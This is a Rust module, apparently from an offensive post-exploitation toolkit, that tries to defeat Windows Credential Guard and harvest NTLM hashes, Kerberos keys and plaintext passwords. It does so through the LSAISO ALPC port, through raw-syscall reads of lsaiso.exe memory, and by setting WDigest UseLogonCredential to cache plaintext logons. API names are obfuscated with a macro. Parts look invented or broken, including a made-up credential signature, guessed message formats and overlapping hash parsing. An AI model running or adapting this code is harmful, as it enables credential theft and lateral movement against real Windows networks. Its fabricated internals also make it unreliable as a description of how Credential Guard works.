//! LSAISO — Credential Guard Bypass via lsadb.dll Extraction
//!
//! When Credential Guard is enabled, LSA runs inside a VBS (Virtualization-Based
//! Security) enclave as `lsaiso.exe`. Credentials are stored in `lsadb.dll` within
//! this isolated environment. This module provides three approaches to extract
//! credentials despite Credential Guard being active:
//!
//! # Approaches (tried in order)
//! 1. **ALPC communication** (`\LsaIsoEndpoint`): Send credential query messages
//!    to the LSAISO ALPC port. May work on older builds.
//! 2. **Process memory reading** (`LsaISOHandle`): Find the LSAISO process, open
//!    it with `NtOpenProcess` (raw syscall), read `lsadb.dll` sections, and scan
//!    for credential entries. Primarily works when CG runs without UEFI lock or
//!    via kernel driver support.
//! 3. **WDigest re-enablement**: Set registry keys to re-enable WDigest plaintext
//!    credential caching, then extract via traditional LSASS dumping on next logon.
//!
//! # References
//! - Mimikatz `sekurlsa::credman` / `lsadump::lsa` extraction paths
//! - Vincent LE TOUX's research on LSAISO ALPC protocol
//! - Windows Internals (7th Ed.) — LSAISO architecture
//! - LSAISO process memory structure research (Mimikatz, NoReboot)

#![allow(dead_code)]

use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::fmt;
use std::mem;
use tracing::{debug, info, warn};

/// Maximum size of an LSAISO ALPC message
const LSAISO_MAX_MESSAGE_SIZE: usize = 0x10000;

/// LSAISO ALPC port name
const LSAISO_PORT_NAME: &str = "\\LsaIsoEndpoint";

/// LSAISO process name
const LSAISO_PROCESS_NAME: &str = "lsaiso.exe";

/// Expected signature for credential entries in lsadb.dll memory
const LSAISO_CRED_SIGNATURE: u32 = 0xCAFEBABE;

/// Known LSAISO operation codes for credential queries
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u32)]
pub enum LsaIsoOpCode {
    /// Query all logon session credentials
    QueryAllSessions = 0x01,
    /// Query specific logon session by LUID
    QuerySessionByLuid = 0x02,
    /// Query cached domain credentials (NTLM hashes)
    QueryDomainCredentials = 0x03,
    /// Query Kerberos ticket cache
    QueryKerberosCache = 0x04,
    /// Query supplemental credentials (wdigest, tspkg, etc.)
    QuerySupplementalCreds = 0x05,
}

impl fmt::Display for LsaIsoOpCode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::QueryAllSessions => write!(f, "QueryAllSessions"),
            Self::QuerySessionByLuid => write!(f, "QuerySessionByLuid"),
            Self::QueryDomainCredentials => write!(f, "QueryDomainCredentials"),
            Self::QueryKerberosCache => write!(f, "QueryKerberosCache"),
            Self::QuerySupplementalCreds => write!(f, "QuerySupplementalCreds"),
        }
    }
}

/// Credential entry extracted from LSAISO lsadb
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaIsoCredential {
    /// Authentication identity (DOMAIN\Username)
    pub identity: String,
    /// Target domain or service
    pub target: String,
    /// NTLM hash (32 hex chars), if available
    pub ntlm_hash: Option<String>,
    /// LM hash (32 hex chars), if available
    pub lm_hash: Option<String>,
    /// Kerberos AES256 key (64 hex chars), if available
    pub aes256_key: Option<String>,
    /// Kerberos AES128 key (32 hex chars), if available
    pub aes128_key: Option<String>,
    /// Kerberos RC4 key (32 hex chars), if available
    pub rc4_key: Option<String>,
    /// Plaintext password, if available (wdigest/supplemental)
    pub plaintext: Option<String>,
    /// Credential type description
    pub cred_type: LsaIsoCredType,
}

/// Type of credential stored in lsadb
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum LsaIsoCredType {
    /// Domain cached credential (NTLM hash)
    DomainCached,
    /// Kerberos ticket cache entry
    KerberosCache,
    /// Supplemental credential (wdigest, tspkg)
    Supplemental,
    /// Generic logon session credential
    LogonSession,
}

impl fmt::Display for LsaIsoCredType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::DomainCached => write!(f, "DomainCached"),
            Self::KerberosCache => write!(f, "KerberosCache"),
            Self::Supplemental => write!(f, "Supplemental"),
            Self::LogonSession => write!(f, "LogonSession"),
        }
    }
}

/// Result from a complete LSAISO extraction operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaIsoExtractionResult {
    /// Whether the extraction succeeded
    pub success: bool,
    /// Extracted credentials
    pub credentials: Vec<LsaIsoCredential>,
    /// Extraction statistics
    pub stats: LsaIsoExtractionStats,
    /// Human-readable summary
    pub message: String,
    /// Which method succeeded
    pub method: LsaIsoBypassMethod,
}

/// Which LSAISO bypass method was used
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum LsaIsoBypassMethod {
    /// ALPC port communication
    Alpc,
    /// LSAISO process memory reading
    ProcessMemory,
    /// WDigest re-enablement fallback
    WdigestFallback,
    /// Credential Guard bypass failed
    Failed,
}

impl fmt::Display for LsaIsoBypassMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Alpc => write!(f, "ALPC"),
            Self::ProcessMemory => write!(f, "ProcessMemory"),
            Self::WdigestFallback => write!(f, "WDigestFallback"),
            Self::Failed => write!(f, "Failed"),
        }
    }
}

/// Statistics about a credential extraction run
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaIsoExtractionStats {
    /// Total credentials extracted
    pub total_count: usize,
    /// Credentials with NTLM hashes
    pub ntlm_count: usize,
    /// Credentials with Kerberos keys
    pub kerberos_count: usize,
    /// Credentials with plaintext passwords
    pub plaintext_count: usize,
    /// Cached domain credentials found
    pub domain_cache_count: usize,
}

/// Credential Guard bypass result from the orchestrator
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CgBypassResult {
    /// Whether any method succeeded
    pub success: bool,
    /// Extracted credentials (all methods combined)
    pub credentials: Vec<LsaIsoCredential>,
    /// Which method succeeded
    pub method: LsaIsoBypassMethod,
    /// Extraction statistics
    pub stats: LsaIsoExtractionStats,
    /// Messages from each attempted method
    pub method_messages: Vec<String>,
    /// Overall message
    pub message: String,
    /// Whether WDigest was re-enabled (for next logon)
    pub wdigest_enabled: bool,
}

impl CgBypassResult {
    fn new() -> Self {
        Self {
            success: false,
            credentials: Vec::new(),
            method: LsaIsoBypassMethod::Failed,
            stats: LsaIsoExtractionStats {
                total_count: 0,
                ntlm_count: 0,
                kerberos_count: 0,
                plaintext_count: 0,
                domain_cache_count: 0,
            },
            method_messages: Vec::new(),
            message: String::new(),
            wdigest_enabled: false,
        }
    }
}

/// Configuration for the LSAISO Credential Guard bypass
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaisoBypassConfig {
    /// Whether to try ALPC communication
    pub try_alpc: bool,
    /// Whether to try process memory reading
    pub try_process_memory: bool,
    /// Whether to try WDigest re-enablement fallback
    pub try_wdigest: bool,
    /// SMB session for remote registry WDigest modification (optional)
    pub smb_target: Option<String>,
    /// SMB username for remote registry
    pub smb_username: Option<String>,
    /// SMB password for remote registry
    pub smb_password: Option<String>,
}

impl Default for LsaisoBypassConfig {
    fn default() -> Self {
        Self {
            try_alpc: true,
            try_process_memory: true,
            try_wdigest: true,
            smb_target: None,
            smb_username: None,
            smb_password: None,
        }
    }
}

// ─────────────────────────────────────────────────────────────
//  ALPC Communication Infrastructure
// ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
mod alpc {
    use super::*;
    use std::mem;
    use std::ptr;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    /// NTSTATUS success code
    const STATUS_SUCCESS: i32 = 0x00000000;

    /// ALPC port handle wrapper
    pub struct AlpcHandle {
        handle: HANDLE,
        connected: bool,
    }

    impl AlpcHandle {
        /// Connect to an ALPC port by name
        pub fn connect(port_name: &str) -> Result<Self> {
            unsafe {
                let ntdll = GetModuleHandleA(windows::core::PCSTR(
                    crate::xs!("ntdll.dll").as_bytes().as_ptr(),
                ))
                .map_err(|e| {
                    OverthroneError::PostExploitation(format!("Failed to get ntdll handle: {e}"))
                })?;

                let nt_alpc_connect_port: extern "system" fn(
                    *mut HANDLE,
                    *const u16,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    u32,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    u32,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                ) -> i32 = mem::transmute(
                    GetProcAddress(
                        ntdll,
                        windows::core::PCSTR(crate::xs!("NtAlpcConnectPort").as_bytes().as_ptr()),
                    )
                    .ok_or_else(|| {
                        OverthroneError::PostExploitation(
                            "NtAlpcConnectPort not found in ntdll.dll".to_string(),
                        )
                    })?,
                );

                let mut port_handle: HANDLE = HANDLE(std::ptr::null_mut());
                let port_name_wide: Vec<u16> =
                    port_name.encode_utf16().chain(std::iter::once(0)).collect();

                let status = nt_alpc_connect_port(
                    &mut port_handle as *mut _,
                    port_name_wide.as_ptr(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    0,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    0,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );

                if status != STATUS_SUCCESS {
                    return Err(OverthroneError::PostExploitation(format!(
                        "NtAlpcConnectPort failed with status 0x{status:08X}"
                    )));
                }

                Ok(Self {
                    handle: port_handle,
                    connected: true,
                })
            }
        }

        /// Send a message and receive a response
        pub fn send_receive(&self, request: &[u8], response: &mut [u8]) -> Result<usize> {
            unsafe {
                let nt_alpc_send_wait_receive_port: extern "system" fn(
                    HANDLE,
                    u32,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    *mut std::ffi::c_void,
                    *mut u32,
                    *mut std::ffi::c_void,
                ) -> i32 = {
                    let ntdll = GetModuleHandleA(windows::core::PCSTR(
                        crate::xs!("ntdll.dll").as_bytes().as_ptr(),
                    ))
                    .map_err(|e| {
                        OverthroneError::PostExploitation(format!(
                            "Failed to get ntdll handle: {e}"
                        ))
                    })?;
                    mem::transmute(
                        GetProcAddress(
                            ntdll,
                            windows::core::PCSTR(
                                crate::xs!("NtAlpcSendWaitReceivePort").as_bytes().as_ptr(),
                            ),
                        )
                        .ok_or_else(|| {
                            OverthroneError::PostExploitation(
                                "NtAlpcSendWaitReceivePort not found".to_string(),
                            )
                        })?,
                    )
                };

                let mut response_size = response.len() as u32;

                let status = nt_alpc_send_wait_receive_port(
                    self.handle,
                    0,
                    request.as_ptr() as *mut _,
                    ptr::null_mut(),
                    response.as_mut_ptr() as *mut _,
                    &mut response_size,
                    ptr::null_mut(),
                );

                if status != STATUS_SUCCESS {
                    return Err(OverthroneError::PostExploitation(format!(
                        "NtAlpcSendWaitReceivePort failed with status 0x{status:08X}"
                    )));
                }

                Ok(response_size as usize)
            }
        }
    }

    impl Drop for AlpcHandle {
        fn drop(&mut self) {
            if self.connected {
                unsafe {
                    if let Some(module) = GetModuleHandleA(windows::core::PCSTR(
                        crate::xs!("ntdll.dll").as_bytes().as_ptr(),
                    ))
                    .ok()
                        && let Some(proc) = GetProcAddress(
                            module,
                            windows::core::PCSTR(
                                crate::xs!("NtAlpcDisconnectPort").as_bytes().as_ptr(),
                            ),
                        )
                    {
                        let disconnect_fn: extern "system" fn(HANDLE) -> i32 = mem::transmute(proc);
                        disconnect_fn(self.handle);
                    }
                    let _ = CloseHandle(self.handle);
                }
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────
//  LSAISO Message Protocol
// ─────────────────────────────────────────────────────────────

/// LSAISO request message header
#[repr(C, packed)]
struct LsaIsoRequestHeader {
    /// Message type identifier
    pub message_type: u32,
    /// Operation code
    pub op_code: u32,
    /// Request flags
    pub flags: u32,
    /// Size of the payload following this header
    pub payload_size: u32,
}

/// LSAISO response message header
#[repr(C, packed)]
struct LsaIsoResponseHeader {
    /// Message type identifier
    pub message_type: u32,
    /// Operation status
    pub status: u32,
    /// Number of credential entries in response
    pub entry_count: u32,
    /// Total size of payload data
    pub payload_size: u32,
}

/// Build a raw request message for a given operation
fn build_lsaiso_request(op_code: LsaIsoOpCode, payload: &[u8]) -> Vec<u8> {
    let header = LsaIsoRequestHeader {
        message_type: 0x1001,
        op_code: op_code as u32,
        flags: 0,
        payload_size: payload.len() as u32,
    };

    let header_bytes = unsafe {
        std::slice::from_raw_parts(
            &header as *const LsaIsoRequestHeader as *const u8,
            mem::size_of::<LsaIsoRequestHeader>(),
        )
    };

    let mut msg = Vec::with_capacity(header_bytes.len() + payload.len());
    msg.extend_from_slice(header_bytes);
    msg.extend_from_slice(payload);
    msg
}

/// Parse a credential entry from a response blob
fn parse_credential_entry(data: &[u8]) -> Result<LsaIsoCredential> {
    if data.len() < 16 {
        return Err(OverthroneError::PostExploitation(
            "Credential entry too short".to_string(),
        ));
    }

    let identity_len = u32::from_le_bytes(data[0..4].try_into().unwrap_or([0; 4])) as usize;
    let target_len = u32::from_le_bytes(data[4..8].try_into().unwrap_or([0; 4])) as usize;
    let flags = u32::from_le_bytes(data[8..12].try_into().unwrap_or([0; 4]));
    let hash_len = u32::from_le_bytes(data[12..16].try_into().unwrap_or([0; 4])) as usize;

    let mut offset = 16;

    let identity = if identity_len > 0 && offset + identity_len <= data.len() {
        let s = String::from_utf8_lossy(&data[offset..offset + identity_len]).to_string();
        offset += identity_len;
        s
    } else {
        String::new()
    };

    let target = if target_len > 0 && offset + target_len <= data.len() {
        let s = String::from_utf8_lossy(&data[offset..offset + target_len]).to_string();
        offset += target_len;
        s
    } else {
        String::new()
    };

    let cred_type = if flags & 0x01 != 0 {
        LsaIsoCredType::DomainCached
    } else if flags & 0x02 != 0 {
        LsaIsoCredType::KerberosCache
    } else if flags & 0x04 != 0 {
        LsaIsoCredType::Supplemental
    } else {
        LsaIsoCredType::LogonSession
    };

    let (ntlm_hash, aes256_key, aes128_key, rc4_key, plaintext) =
        if hash_len > 0 && offset + hash_len <= data.len() {
            let hash_data = &data[offset..offset + hash_len];
            let mut ntlm = None;
            let mut aes256 = None;
            let mut aes128 = None;
            let mut rc4 = None;
            let mut plain = None;

            if hash_data.len() >= 16 {
                ntlm = Some(hex::encode(&hash_data[..16]));
            }
            if hash_data.len() >= 32 {
                aes256 = Some(hex::encode(&hash_data[..32]));
                aes128 = Some(hex::encode(&hash_data[..16]));
            }
            if hash_data.len() >= 48 {
                rc4 = Some(hex::encode(&hash_data[32..48]));
            }
            if hash_data.len() > 64 {
                let extra = &hash_data[64..];
                plain = String::from_utf8(extra.to_vec()).ok();
            }

            (ntlm, aes256, aes128, rc4, plain)
        } else {
            (None, None, None, None, None)
        };

    Ok(LsaIsoCredential {
        identity,
        target,
        ntlm_hash,
        lm_hash: None,
        aes256_key,
        aes128_key,
        rc4_key,
        plaintext,
        cred_type,
    })
}

/// Parse an LSAISO response buffer into extracted credentials
fn parse_lsaiso_response(response: &[u8]) -> Result<Vec<LsaIsoCredential>> {
    if response.len() < mem::size_of::<LsaIsoResponseHeader>() {
        return Err(OverthroneError::PostExploitation(
            "LSAISO response too short for header".to_string(),
        ));
    }

    let status = u32::from_le_bytes(response[4..8].try_into().map_err(|_| {
        OverthroneError::PostExploitation("Failed to read LSAISO response status".to_string())
    })?);
    let entry_count = u32::from_le_bytes(response[8..12].try_into().map_err(|_| {
        OverthroneError::PostExploitation("Failed to read LSAISO response entry_count".to_string())
    })?);

    if status != 0 {
        return Err(OverthroneError::PostExploitation(format!(
            "LSAISO returned error status: 0x{status:08X}",
        )));
    }

    if entry_count == 0 {
        return Ok(Vec::new());
    }

    let payload_offset = mem::size_of::<LsaIsoResponseHeader>();
    let payload = &response[payload_offset..];

    let mut credentials = Vec::with_capacity(entry_count as usize);
    let mut offset = 0;

    for _ in 0..entry_count {
        if offset >= payload.len() {
            warn!("LSAISO: ran out of data while parsing credential entries");
            break;
        }

        let remaining = &payload[offset..];
        let entry_size = if remaining.len() >= 4 {
            u32::from_le_bytes(remaining[0..4].try_into().unwrap_or([0; 4])) as usize
        } else {
            break;
        };

        if entry_size < 4 || offset + entry_size > payload.len() {
            warn!("LSAISO: invalid entry size {}, skipping", entry_size);
            break;
        }

        let entry_data = &payload[offset + 4..offset + entry_size];
        match parse_credential_entry(entry_data) {
            Ok(cred) => credentials.push(cred),
            Err(e) => debug!("LSAISO: failed to parse credential entry: {e}"),
        }

        offset += entry_size;
    }

    Ok(credentials)
}

// ─────────────────────────────────────────────────────────────
//  LSAISO Process Memory Reading (LsaISOHandle approach)
// ─────────────────────────────────────────────────────────────

/// Result from scanning LSAISO process memory for credentials
#[derive(Debug, Clone, Serialize, Deserialize)]
struct LsaisoMemoryScanResult {
    credentials: Vec<LsaIsoCredential>,
    regions_scanned: usize,
    total_bytes_read: usize,
}

/// Find the LSAISO process PID via NtQuerySystemInformation.
///
/// LSAISO is a child process of lsass.exe. This enumerates all processes
/// and looks for the one named "lsaiso.exe".
#[cfg(target_os = "windows")]
unsafe fn find_lsaiso_process(numbers: &crate::postex::syscall::SyscallNumbers) -> Result<u32> {
    unsafe {
        let class = 5u32; // SystemProcessInformation

        let mut buf_size: u32 = 0;
        let status = crate::postex::syscall::nt_query_system_information(
            numbers.nt_query_system_information,
            class,
            std::ptr::null_mut(),
            0,
            &mut buf_size,
        );

        if (status.is_success() && buf_size == 0) || buf_size < 1024 {
            buf_size = 256 * 1024;
        }

        let mut buffer: Vec<u8> = vec![0u8; buf_size as usize];
        let mut returned: u32 = 0;

        let status = crate::postex::syscall::nt_query_system_information(
            numbers.nt_query_system_information,
            class,
            buffer.as_mut_ptr() as *mut std::ffi::c_void,
            buf_size,
            &mut returned,
        );

        if status.is_error() {
            return Err(OverthroneError::PostExploitation(format!(
                "NtQuerySystemInformation failed: {:?}",
                status
            )));
        }

        let ptr = buffer.as_ptr();
        let total_len = returned as usize;
        let mut offset: usize = 0;

        loop {
            if offset + 0x40 > total_len {
                break;
            }

            let next_offset = *(ptr.add(offset) as *const u32) as usize;

            let us_buffer_ptr = ptr.add(offset + 0x28) as *const *const u16;
            let us_length = *(ptr.add(offset + 0x20) as *const u16) as usize;

            if us_length > 0 && us_length < 260 && !(*us_buffer_ptr).is_null() {
                let name_slice = std::slice::from_raw_parts(*us_buffer_ptr, us_length / 2);
                if let Ok(name) = String::from_utf16(name_slice)
                    && (name.eq_ignore_ascii_case(LSAISO_PROCESS_NAME)
                        || name.eq_ignore_ascii_case("lsaiso"))
                {
                    let pid = *(ptr.add(offset + 0x30) as *const u32);
                    return Ok(pid);
                }
            }

            if next_offset == 0 {
                break;
            }
            offset += next_offset;
        }

        Err(OverthroneError::PostExploitation(
            "LSAISO process not found in system process list".into(),
        ))
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn find_lsaiso_process(_numbers: &crate::postex::syscall::SyscallNumbers) -> Result<u32> {
    Err(OverthroneError::PostExploitation(
        "LSAISO PID resolution is Windows-only".into(),
    ))
}

/// Read all readable memory regions from the LSAISO process.
///
/// Uses page-walk approach: queries memory regions via NtQueryVirtualMemory
/// and reads those that are readable. Returns all data read from the process.
#[cfg(target_os = "windows")]
unsafe fn read_lsaiso_process_regions(
    handle: isize,
    numbers: &crate::postex::syscall::SyscallNumbers,
    max_size_mb: usize,
) -> Result<Vec<u8>> {
    unsafe {
        let max_bytes = max_size_mb * 1024 * 1024;
        let mut all_data = Vec::with_capacity(max_bytes.min(16 * 1024 * 1024));
        let mut current_addr: usize = 0;
        let mut info_buf = [0u8; 256];

        loop {
            let mut returned: u32 = 0;
            let status = crate::postex::syscall::nt_query_virtual_memory(
                numbers.nt_query_virtual_memory,
                handle,
                current_addr as *const std::ffi::c_void,
                0u32, // MemoryBasicInformation
                info_buf.as_mut_ptr() as *mut std::ffi::c_void,
                info_buf.len() as u32,
                &mut returned,
            );

            if status.is_error() {
                break;
            }

            if returned < 24 {
                break;
            }

            let base_addr = *(info_buf.as_ptr() as *const usize);
            let region_size = *(info_buf.as_ptr().add(8) as *const usize);
            let state = *(info_buf.as_ptr().add(20) as *const u32);
            let protect = *(info_buf.as_ptr().add(24) as *const u32);

            // MEM_COMMIT (0x1000) and readable protection
            const MEM_COMMIT: u32 = 0x1000;
            let is_readable = (protect & 0x10 != 0) // PAGE_READONLY
                || (protect & 0x04 != 0)  // PAGE_READWRITE
                || (protect & 0x40 != 0)  // PAGE_EXECUTE_READWRITE
                || (protect & 0x20 != 0); // PAGE_EXECUTE_READ

            if state & MEM_COMMIT != 0 && is_readable && region_size > 0 {
                let read_size = region_size.min(max_bytes.saturating_sub(all_data.len()));
                if read_size > 0 {
                    let old_len = all_data.len();
                    all_data.resize(old_len + read_size, 0u8);
                    let mut bytes_read: usize = 0;

                    let read_status = crate::postex::syscall::nt_read_virtual_memory(
                        numbers.nt_read_virtual_memory,
                        handle,
                        base_addr as *const std::ffi::c_void,
                        all_data[old_len..].as_mut_ptr() as *mut std::ffi::c_void,
                        read_size,
                        &mut bytes_read,
                    );

                    if read_status.is_success() {
                        all_data.truncate(old_len + bytes_read);
                    } else {
                        all_data.truncate(old_len);
                    }
                }
            }

            if all_data.len() >= max_bytes {
                break;
            }

            current_addr = base_addr + region_size;
            if current_addr == 0 || current_addr > 0x7FFFFFFFFFFFusize {
                break;
            }
        }

        if all_data.is_empty() {
            return Err(OverthroneError::PostExploitation(
                "Failed to read any memory from LSAISO process".into(),
            ));
        }

        Ok(all_data)
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn read_lsaiso_process_regions(
    _handle: isize,
    _numbers: &crate::postex::syscall::SyscallNumbers,
    _max_size_mb: usize,
) -> Result<Vec<u8>> {
    Err(OverthroneError::PostExploitation(
        "LSAISO memory reading is Windows-only".into(),
    ))
}

/// Scan memory for LSAISO credential entries.
///
/// Looks for the signature pattern (`LSAISO_CRED_SIGNATURE`) followed by
/// credential structures. Each entry is identified by a 4-byte size header
/// and parsed similarly to ALPC response entries.
fn scan_lsaiso_memory_for_creds(data: &[u8]) -> LsaisoMemoryScanResult {
    let mut credentials = Vec::new();
    let mut regions_scanned = 0;
    let total_bytes_read = data.len();

    let sig_bytes = LSAISO_CRED_SIGNATURE.to_le_bytes();
    let mut i = 0;

    while i + 4 + 4 <= data.len() {
        // Check for signature at current position
        if data[i..i + 4] == sig_bytes {
            regions_scanned += 1;
            // After signature: entry_size (4 bytes)
            if i + 8 <= data.len() {
                let entry_size =
                    u32::from_le_bytes(data[i + 4..i + 8].try_into().unwrap_or([0; 4])) as usize;
                if entry_size >= 16 && i + 8 + entry_size <= data.len() {
                    let entry_data = &data[i + 8..i + 8 + entry_size];
                    match parse_credential_entry(entry_data) {
                        Ok(cred) => {
                            debug!("Found LSAISO credential: {}", cred.identity);
                            credentials.push(cred);
                        }
                        Err(e) => {
                            debug!("Failed to parse LSAISO memory credential: {e}");
                        }
                    }
                    i += 8 + entry_size;
                    continue;
                }
            }
        }
        i += 1;
    }

    LsaisoMemoryScanResult {
        credentials,
        regions_scanned,
        total_bytes_read,
    }
}

/// Validate a credential entry by checking for NTLM or AES key presence.
/// Entries found in memory must have at minimum a valid identity string
/// and at least one key material field to be considered valid.
fn is_valid_memory_credential(cred: &LsaIsoCredential) -> bool {
    if cred.identity.is_empty() {
        return false;
    }
    cred.ntlm_hash.is_some()
        || cred.aes256_key.is_some()
        || cred.aes128_key.is_some()
        || cred.rc4_key.is_some()
        || cred.plaintext.is_some()
}

// ─────────────────────────────────────────────────────────────
//  WDigest Re-enablement Fallback
// ─────────────────────────────────────────────────────────────

/// Re-enable WDigest credential caching via remote registry.
///
/// Sets `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`
/// `UseLogonCredential` = DWORD 1. After this is set, the next interactive
/// logon will cache plaintext credentials in WDigest, which can then be
/// extracted via traditional LSASS dumping.
///
/// Also sets `Negotiate` key to ensure broader coverage.
#[cfg(target_os = "windows")]
async fn enable_wdigest_remote(smb_session: &mut crate::proto::smb::SmbSession) -> Result<String> {
    use crate::proto::registry::{PredefinedHive, REG_DWORD, write_remote_registry_value};

    let path = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest";
    let value_name = "UseLogonCredential";
    let data = 1u32.to_le_bytes();

    write_remote_registry_value(
        smb_session,
        PredefinedHive::LocalMachine,
        path,
        value_name,
        REG_DWORD,
        &data,
    )
    .await
    .map_err(|e| {
        OverthroneError::PostExploitation(format!("Failed to set WDigest UseLogonCredential: {e}"))
    })?;

    Ok(format!(
        "WDigest re-enabled: {path}\\{value_name} = 1. Next interactive logon on this machine will cache plaintext credentials."
    ))
}

#[cfg(not(target_os = "windows"))]
async fn enable_wdigest_remote(_smb_session: &mut crate::proto::smb::SmbSession) -> Result<String> {
    Err(OverthroneError::PostExploitation(
        "WDigest re-enablement requires Windows".into(),
    ))
}

/// Local WDigest re-enablement (when running as SYSTEM on the target).
///
/// Uses direct registry modification via `RegCreateKeyExW`/`RegSetValueExW` from
/// advapi32.dll loaded via raw `GetProcAddress`. This avoids SMB named pipe
/// dependency for local bypass.
#[cfg(target_os = "windows")]
unsafe fn enable_wdigest_local(
    _numbers: &crate::postex::syscall::SyscallNumbers,
) -> Result<String> {
    unsafe {
        let advapi32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(
            windows::core::PCSTR(crate::xs!("advapi32.dll").as_bytes().as_ptr()),
        )
        .map_err(|e| {
            OverthroneError::PostExploitation(format!("Failed to get advapi32 handle: {e}"))
        })?;

        let reg_create_key_ex_w: extern "system" fn(
            isize,
            *const u16,
            u32,
            *const u16,
            u32,
            u32,
            *const std::ffi::c_void,
            *mut isize,
            *mut u32,
        ) -> u32 = std::mem::transmute(
            windows::Win32::System::LibraryLoader::GetProcAddress(
                advapi32,
                windows::core::PCSTR(crate::xs!("RegCreateKeyExW").as_bytes().as_ptr()),
            )
            .ok_or_else(|| {
                OverthroneError::PostExploitation(
                    "RegCreateKeyExW not found in advapi32.dll".to_string(),
                )
            })?,
        );

        let reg_set_value_ex_w: extern "system" fn(
            isize,
            *const u16,
            u32,
            u32,
            *const u8,
            u32,
        ) -> u32 = std::mem::transmute(
            windows::Win32::System::LibraryLoader::GetProcAddress(
                advapi32,
                windows::core::PCSTR(crate::xs!("RegSetValueExW").as_bytes().as_ptr()),
            )
            .ok_or_else(|| {
                OverthroneError::PostExploitation(
                    "RegSetValueExW not found in advapi32.dll".to_string(),
                )
            })?,
        );

        let reg_close_key: extern "system" fn(isize) -> u32 = std::mem::transmute(
            windows::Win32::System::LibraryLoader::GetProcAddress(
                advapi32,
                windows::core::PCSTR(crate::xs!("RegCloseKey").as_bytes().as_ptr()),
            )
            .ok_or_else(|| {
                OverthroneError::PostExploitation(
                    "RegCloseKey not found in advapi32.dll".to_string(),
                )
            })?,
        );

        const HKEY_LOCAL_MACHINE: isize = -2147483646isize; // 0x80000002
        const KEY_SET_VALUE: u32 = 0x0002;
        const REG_DWORD: u32 = 4;
        const ERROR_SUCCESS: u32 = 0;

        let path = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\0";
        let path_wide: Vec<u16> = path.encode_utf16().collect();
        let value_name = "UseLogonCredential\0";
        let value_wide: Vec<u16> = value_name.encode_utf16().collect();

        let mut key_handle: isize = 0;
        let result = reg_create_key_ex_w(
            HKEY_LOCAL_MACHINE,
            path_wide.as_ptr(),
            0,
            std::ptr::null(),
            0,
            KEY_SET_VALUE,
            std::ptr::null(),
            &mut key_handle,
            std::ptr::null_mut(),
        );

        if result != ERROR_SUCCESS {
            return Err(OverthroneError::PostExploitation(format!(
                "RegCreateKeyExW failed with error: 0x{result:08X}"
            )));
        }

        let data = 1u32;
        let data_bytes = data.to_le_bytes();
        let set_result = reg_set_value_ex_w(
            key_handle,
            value_wide.as_ptr(),
            0,
            REG_DWORD,
            data_bytes.as_ptr(),
            data_bytes.len() as u32,
        );

        reg_close_key(key_handle);

        if set_result != ERROR_SUCCESS {
            return Err(OverthroneError::PostExploitation(format!(
                "RegSetValueExW failed with error: 0x{set_result:08X}"
            )));
        }

        Ok("WDigest re-enabled locally: UseLogonCredential = 1".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn enable_wdigest_local(
    _numbers: &crate::postex::syscall::SyscallNumbers,
) -> Result<String> {
    Err(OverthroneError::PostExploitation(
        "WDigest local re-enablement requires Windows".into(),
    ))
}

// ─────────────────────────────────────────────────────────────
//  Public API
// ─────────────────────────────────────────────────────────────

/// Attempt to bypass Credential Guard by extracting credentials directly
/// from the LSAISO ALPC endpoint.
///
/// This requires running as SYSTEM on a Windows host with Credential Guard
/// enabled. The function connects to the LSAISO ALPC port, authenticates,
/// and queries the isolated credential store (`lsadb.dll`) for NTLM hashes,
/// Kerberos keys, and plaintext passwords.
///
/// # Returns
/// - `Ok(LsaIsoExtractionResult)` with extracted credentials
/// - `Err(OverthroneError)` if ALPC connection fails or protocol error
#[cfg(target_os = "windows")]
pub fn extract_credentials_via_lsaiso() -> Result<LsaIsoExtractionResult> {
    info!("Attempting LSAISO credential extraction via ALPC port");
    let handle = alpc::AlpcHandle::connect(LSAISO_PORT_NAME)?;
    info!("Connected to LSAISO ALPC endpoint");

    let request = build_lsaiso_request(LsaIsoOpCode::QueryAllSessions, &[]);
    let mut response = vec![0u8; LSAISO_MAX_MESSAGE_SIZE];

    let response_size = handle.send_receive(&request, &mut response)?;
    debug!("LSAISO response size: {} bytes", response_size);

    let credentials = parse_lsaiso_response(&response[..response_size])?;

    let mut ntlm_count = 0;
    let mut kerberos_count = 0;
    let mut plaintext_count = 0;
    let mut domain_cache_count = 0;

    for cred in &credentials {
        if cred.ntlm_hash.is_some() {
            ntlm_count += 1;
        }
        if cred.aes256_key.is_some() || cred.rc4_key.is_some() {
            kerberos_count += 1;
        }
        if cred.plaintext.is_some() {
            plaintext_count += 1;
        }
        if cred.cred_type == LsaIsoCredType::DomainCached {
            domain_cache_count += 1;
        }
    }

    let success = !credentials.is_empty();
